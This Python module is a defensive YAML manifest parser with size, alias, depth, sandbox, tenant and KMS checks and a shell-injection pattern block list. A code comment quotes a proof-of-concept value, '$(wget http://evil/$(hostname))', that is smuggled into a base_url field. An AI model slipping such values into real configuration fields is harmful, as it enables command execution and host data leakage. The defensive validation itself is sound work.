"""
Yashigani Manifest — Safe YAML parser (M1, M2, M3).

M1 — safe-parse: yaml.safe_load only (no ruamel); 512 KB pre-parse cap;
     sandboxed subprocess via resource.setrlimit (AS 256 MB, CPU 5 s);
     object-graph nesting depth cap 100; & / * count cap ≈ 100 combined.

M2 — tenant_id regex ``^[a-z0-9][a-z0-9-]{1,62}[a-z0-9]$`` + post-interp
     KMS-prefix assertion ``/tenant/<id>/`` for every kms_path field.

M3 — NUL-strip-and-reject; multi-line shell-bound field rejection;
     parser-side constraint enforcement (codegen shell quoting is W4 Su).

Last updated: 2026-05-28T00:00:00+00:00
"""
from __future__ import annotations

import logging
import multiprocessing
import re
from pathlib import Path
from typing import Any

import yaml

_log = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# M1 constants
# ---------------------------------------------------------------------------

# 512 KB hard cap before any parsing begins.
_MAX_MANIFEST_BYTES: int = 512 * 1024

# Combined & + * count cap (anchor definition + reference).
_MAX_ANCHOR_ALIAS_COUNT: int = 100

# Maximum object-graph nesting depth enforced during YAML construction.
# Applied in _DepthTrackingLoader.construct_object.  Set to 100 to allow
# reasonable real-world manifests while still bounding billion-laughs-style
# deep alias trees.
#
# F1 (Iris LOW): the previous value was 10 with a silent ``* 10`` multiplier
# inside _DepthTrackingLoader (actual limit = 100), which made the docstring
# and the runtime behaviour disagree.  The constant now directly represents
# the enforced limit.
_MAX_ANCHOR_ALIAS_DEPTH: int = 100

# Resource limits for the sandboxed subprocess (Linux; no-op on macOS).
_SANDBOX_AS_BYTES: int = 256 * 1024 * 1024  # 256 MB virtual address space
_SANDBOX_CPU_SECS: int = 5

# ---------------------------------------------------------------------------
# M2 constants
# ---------------------------------------------------------------------------

_TENANT_ID_RE = re.compile(r"^[a-z0-9][a-z0-9-]{1,62}[a-z0-9]$")
_KMS_PREFIX_TEMPLATE = "/tenant/{tenant_id}/"

# ---------------------------------------------------------------------------
# M3 — shell-bound fields that must not contain newlines.
# These are the fields whose values reach shell codegen (Su W4).
# The parser enforces the constraint here; the codegen enforces quoting.
# ---------------------------------------------------------------------------

# Field paths (dot-notation) that are shell-bound and must not span lines.
_SHELL_BOUND_FIELDS: frozenset[str] = frozenset({
    "metadata.name",
    "metadata.tenant_id",
    "spec.image.repository",
    "spec.image.tag",
    "spec.image.digest",
    "spec.model_egress.provider",
    "spec.model_egress.base_url",
    "spec.identity.spiffe.override_id",
})

# ---------------------------------------------------------------------------
# ParseError
# ---------------------------------------------------------------------------


class ManifestParseError(ValueError):
    """Raised for any manifest parse / validation failure (M1-M3)."""

    def __init__(self, rule: str, detail: str, field: str = "") -> None:
        self.rule = rule
        self.detail = detail
        self.field = field
        super().__init__(f"[{rule}] {field}: {detail}" if field else f"[{rule}] {detail}")


# ---------------------------------------------------------------------------
# Pre-parse text-scan guards (before yaml.safe_load touches the bytes)
# ---------------------------------------------------------------------------

def _prescan_guards(text: str) -> None:
    """
    Apply M1 and M3 guards on the raw UTF-8 text before YAML parsing.

    Raises ManifestParseError on violation.
    """
    # M1 — combined anchor/alias count cap
    anchor_count = text.count("&")
    alias_count = text.count("*")
    combined = anchor_count + alias_count
    if combined > _MAX_ANCHOR_ALIAS_COUNT:
        raise ManifestParseError(
            "M1_anchor_alias_cap",
            "combined anchor (&) + alias (*) count %d exceeds cap %d"
            % (combined, _MAX_ANCHOR_ALIAS_COUNT),
        )

    # M3 — NUL byte rejection (null byte injection, CVE-class)
    if "\x00" in text:
        raise ManifestParseError(
            "M3_nul_byte",
            "manifest contains a NUL byte (\\x00); rejected",
        )


# ---------------------------------------------------------------------------
# Depth-tracking safe loader (anchor/alias depth cap)
# ---------------------------------------------------------------------------

class _DepthTrackingLoader(yaml.SafeLoader):
    """
    yaml.SafeLoader subclass that tracks anchor nesting depth.

    YAML's safe_load already rejects arbitrary code execution.  This subclass
    adds a depth counter so that deeply-nested anchor/alias trees (billion-
    laughs style) are rejected before fully expanding.

    The depth limit is applied during construction, not post-load.
    """

    def __init__(self, stream: Any) -> None:
        super().__init__(stream)
        self._depth: int = 0

    def construct_object(self, node: Any, deep: bool = False) -> Any:
        self._depth += 1
        if self._depth > _MAX_ANCHOR_ALIAS_DEPTH:
            # Overly deep object graph — reject.
            # F1: constant now directly represents the limit (no hidden * 10).
            raise ManifestParseError(
                "M1_nesting_depth",
                "YAML object nesting depth exceeds limit (%d)" % _MAX_ANCHOR_ALIAS_DEPTH,
            )
        try:
            result = super().construct_object(node, deep=deep)
        finally:
            self._depth -= 1
        return result


def _safe_load(text: str) -> dict:
    """
    Load YAML using yaml.safe_load (via DepthTrackingLoader).

    Never uses ruamel or any other loader that allows arbitrary Python
    object construction.  Only yaml.SafeLoader / subclass thereof.
    """
    try:
        obj = yaml.load(text, Loader=_DepthTrackingLoader)  # noqa: S506 — SafeLoader subclass
    except ManifestParseError:
        raise
    except yaml.YAMLError as exc:
        raise ManifestParseError("M1_yaml_syntax", str(exc)) from exc
    if not isinstance(obj, dict):
        raise ManifestParseError("M1_not_mapping", "manifest root must be a YAML mapping")
    return obj


# ---------------------------------------------------------------------------
# M3 — field-level constraint checks on parsed dict
# ---------------------------------------------------------------------------

def _dot_get(d: dict, path: str) -> Any:
    """Retrieve a value by dot-path, returning None if absent."""
    parts = path.split(".")
    current: Any = d
    for part in parts:
        if not isinstance(current, dict):
            return None
        current = current.get(part)
    return current


def _check_shell_bound_fields(parsed: dict) -> None:
    """
    M3 — reject any shell-bound field that contains a newline or carriage
    return.  NUL bytes are caught in _prescan_guards before parsing.
    """
    for field_path in _SHELL_BOUND_FIELDS:
        value = _dot_get(parsed, field_path)
        if value is None:
            continue
        if not isinstance(value, str):
            continue
        if "\n" in value or "\r" in value:
            raise ManifestParseError(
                "M3_multiline_shell_field",
                "field value contains a newline — shell-bound fields must be single-line",
                field=field_path,
            )


# ---------------------------------------------------------------------------
# M3 — injection pattern check (property-test anchor)
# ---------------------------------------------------------------------------

# Patterns that must NEVER appear literally in any string field value.
# Property test: inject "; $(cmd)" or "$(cmd)" into every field, assert ManifestParseError.
#
# F2 (Laura MED): bare "$(...)" without a leading semicolon was previously
# undetected — PoC: base_url: "$(wget http://evil/$(hostname))" passed all checks.
# The standalone r"\$\(" pattern must come BEFORE (or alongside) the semicolon-
# prefixed form so that bare command-substitution strings are also caught.
_INJECTION_PATTERNS: tuple[re.Pattern, ...] = (
    re.compile(r"\$\("),              # bare "$(cmd)" command substitution (F2 Laura)
    re.compile(r";.*\$\("),           # "; $(cmd)" shell substitution (redundant but kept for clarity)
    re.compile(r"\$\{[^}]*\}"),       # "${var}" shell variable expansion
    re.compile(r"`[^`]+`"),           # `backtick` command substitution
    re.compile(r"\|\s*\w"),           # pipe to command
    re.compile(r"&&|\|\|"),           # shell logic operators
    re.compile(r"\n\s*-\s+\w"),       # YAML list-item injection across newline
)


def _check_injection_patterns(obj: Any, path: str = "") -> None:
    """
    Recursively walk the parsed manifest and reject any string value
    containing a known injection pattern (M3).

    Property test: inject `"; $(cmd)"` into every field → ManifestParseError.
    """
    if isinstance(obj, dict):
        for key, value in obj.items():
            child_path = f"{path}.{key}" if path else key
            _check_injection_patterns(value, child_path)
    elif isinstance(obj, list):
        for i, item in enumerate(obj):
            _check_injection_patterns(item, f"{path}[{i}]")
    elif isinstance(obj, str):
        for pattern in _INJECTION_PATTERNS:
            if pattern.search(obj):
                raise ManifestParseError(
                    "M3_injection_pattern",
                    "field value matches a shell-injection pattern; rejected",
                    field=path,
                )


# ---------------------------------------------------------------------------
# M2 — tenant_id + KMS-prefix assertions
# ---------------------------------------------------------------------------

def _validate_tenant_id(tenant_id: str) -> None:
    """M2 — validate tenant_id regex."""
    if not _TENANT_ID_RE.match(tenant_id):
        raise ManifestParseError(
            "M2_tenant_id_regex",
            "tenant_id %r does not match ^[a-z0-9][a-z0-9-]{1,62}[a-z0-9]$" % tenant_id,
            field="metadata.tenant_id",
        )


def _validate_kms_prefix(parsed: dict, tenant_id: str) -> None:
    """
    M2 — every kms_path field in spec.secrets must start with
    ``/tenant/<tenant_id>/``.  Walk spec.secrets[].kms_path.
    """
    expected_prefix = _KMS_PREFIX_TEMPLATE.format(tenant_id=tenant_id)
    secrets = (parsed.get("spec") or {}).get("secrets") or []
    for i, secret in enumerate(secrets):
        if not isinstance(secret, dict):
            continue
        kms_path = secret.get("kms_path")
        if kms_path is None:
            continue
        if not isinstance(kms_path, str):
            raise ManifestParseError(
                "M2_kms_prefix",
                "kms_path must be a string",
                field="spec.secrets[%d].kms_path" % i,
            )
        if not kms_path.startswith(expected_prefix):
            raise ManifestParseError(
                "M2_kms_prefix",
                "kms_path %r must start with %r" % (kms_path, expected_prefix),
                field="spec.secrets[%d].kms_path" % i,
            )


# ---------------------------------------------------------------------------
# Sandboxed subprocess parse (M1 resource limits)
# ---------------------------------------------------------------------------

def _sandbox_worker_entry(text: str, result_queue: multiprocessing.Queue) -> None:  # type: ignore[type-arg]
    """
    Entry point for the sandboxed subprocess.  Applies resource limits then
    calls the full parse pipeline.

    This function runs in a child process.  It communicates results via a
    multiprocessing.Queue (JSON-serialisable: either the parsed dict or an
    error dict).
    """
    # Apply resource limits (Linux only; graceful no-op on macOS).
    try:
        import resource  # noqa: PLC0415 — conditional import
        # RLIMIT_AS — virtual address space cap (256 MB)
        resource.setrlimit(resource.RLIMIT_AS, (_SANDBOX_AS_BYTES, _SANDBOX_AS_BYTES))
        # RLIMIT_CPU — CPU time cap (5 s)
        resource.setrlimit(resource.RLIMIT_CPU, (_SANDBOX_CPU_SECS, _SANDBOX_CPU_SECS))
    except (ImportError, ValueError, OSError):
        # macOS / Windows: resource module may not support AS limit.
        # Proceed without the limit; seccomp-bpf is a v2 enhancement (decision #8).
        pass

    try:
        parsed = _safe_load(text)
        _prescan_guards(text)  # second pass after load (belt-and-suspenders)
        result_queue.put({"ok": True, "data": parsed})
    except ManifestParseError as exc:
        result_queue.put({"ok": False, "rule": exc.rule, "detail": exc.detail, "field": exc.field})
    except Exception as exc:  # noqa: BLE001
        result_queue.put({"ok": False, "rule": "M1_unexpected", "detail": str(exc)[:512], "field": ""})


def _parse_sandboxed(text: str) -> dict:
    """
    Run the YAML parse in a sandboxed subprocess with resource limits.

    On macOS (no RLIMIT_AS support) the subprocess still runs in a separate
    process for isolation; the resource limits silently no-op.
    """
    ctx = multiprocessing.get_context("spawn")
    q: multiprocessing.Queue = ctx.Queue()  # type: ignore[type-arg]
    proc = ctx.Process(target=_sandbox_worker_entry, args=(text, q), daemon=True)
    proc.start()
    proc.join(timeout=_SANDBOX_CPU_SECS + 2)

    if proc.is_alive():
        proc.kill()
        proc.join(timeout=2)
        raise ManifestParseError(
            "M1_sandbox_timeout",
            "manifest parsing exceeded CPU time limit (%d s)" % _SANDBOX_CPU_SECS,
        )

    if proc.exitcode != 0 and q.empty():
        raise ManifestParseError(
            "M1_sandbox_crash",
            "sandboxed parser crashed (exit code %d)" % (proc.exitcode or -1),
        )

    if q.empty():
        raise ManifestParseError("M1_sandbox_empty_result", "sandboxed parser returned no result")

    result = q.get_nowait()
    if not result.get("ok"):
        raise ManifestParseError(
            result.get("rule", "M1_unknown"),
            result.get("detail", "unknown error"),
            result.get("field", ""),
        )
    return result["data"]


# ---------------------------------------------------------------------------
# Public parse API
# ---------------------------------------------------------------------------

def parse_manifest(source: Path | str | bytes) -> dict:
    """
    Parse a Yashigani agent manifest with full M1/M2/M3 enforcement.

    Args:
        source: Path to a manifest file, a UTF-8 string, or raw bytes.

    Returns:
        The parsed manifest as a plain dict.  The dict is not yet schema-
        validated (call ``linter.validate_manifest`` for that) but all
        low-level safety guards have been applied.

    Raises:
        ManifestParseError: on any M1/M2/M3 violation.
    """
    # Resolve to bytes
    if isinstance(source, Path):
        if not source.is_file():
            raise ManifestParseError("M1_not_file", "manifest path does not exist: %s" % source)
        raw: bytes = source.read_bytes()
    elif isinstance(source, str):
        raw = source.encode("utf-8", errors="strict")
    elif isinstance(source, bytes):
        raw = source
    else:
        raise TypeError("source must be Path, str, or bytes")

    # M1 — size cap
    if len(raw) > _MAX_MANIFEST_BYTES:
        raise ManifestParseError(
            "M1_size_cap",
            "manifest size %d bytes exceeds cap %d bytes" % (len(raw), _MAX_MANIFEST_BYTES),
        )

    # Decode UTF-8
    try:
        text: str = raw.decode("utf-8")
    except UnicodeDecodeError as exc:
        raise ManifestParseError("M1_encoding", "manifest is not valid UTF-8: %s" % exc) from exc

    # M1 + M3 pre-scan (fast, runs in-process before we pay subprocess cost)
    _prescan_guards(text)

    # M1 — sandboxed parse with resource limits
    parsed = _parse_sandboxed(text)

    # M3 — shell-bound field checks
    _check_shell_bound_fields(parsed)
    _check_injection_patterns(parsed)

    # M2 — tenant_id regex
    metadata = parsed.get("metadata") or {}
    tenant_id = metadata.get("tenant_id", "")
    if tenant_id:
        _validate_tenant_id(tenant_id)
        # M2 — KMS-prefix assertion (post-interp)
        _validate_kms_prefix(parsed, tenant_id)

    return parsed
